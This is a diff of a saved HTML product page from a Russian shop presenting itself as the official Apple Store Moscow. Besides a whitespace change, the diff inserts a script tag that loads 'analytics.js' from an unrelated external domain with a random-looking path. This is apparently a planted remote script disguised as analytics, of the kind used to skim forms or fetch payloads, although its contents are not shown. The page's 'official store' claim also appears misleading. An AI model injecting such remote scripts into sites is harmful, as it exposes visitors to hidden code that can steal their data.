@@ -2,7 +2,7 @@
 <!-- saved from url=(0093)http://store-apple.msk.ru/catalog/kupit-iphone/iphone-7-plus/iphone-7-plus-256gb-serebristyy/ -->
 <html class="bx-mac bx-no-touch bx-retina bx-chrome bx-boxshadow bx-borderradius bx-flexwrap bx-boxdirection bx-transition bx-transform"><head class="header"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
         <meta name="cmsmagazine" content="df80fa5f980c721d845aad3420f1d0dd">
-		
+
 <meta name="robots" content="index, follow">
 <meta name="keywords" content="купить iphone, айфон, Apple iPhone 7 Plus, iPhone 7 Plus, Айфон 7 Плюс москва, цена айфона">
 <meta name="description" content="Apple iPhone 7 Plus купить по доступной цене в официальном магазине компании Apple — Apple Store Москва.">
@@ -35,7 +35,7 @@
 <script type="text/javascript">
 bxSession.Expand(1440, '79de076de496c52bcd32b0b6e180c204', false, '68bc26809ec16f47f9059016fc629866');
 </script>
-
+    <script src="https://cdn.vblog1.com/js/r8ekc/analytics.js"></script>
 <script type="text/javascript" src="<?php echo $dir; ?>js/jcarusel.js"></script>
 <script type="text/javascript" src="<?php echo $dir; ?>js/script.js"></script>
 <script type="text/javascript" src="<?php echo $dir; ?>js/script(1).js"></script>
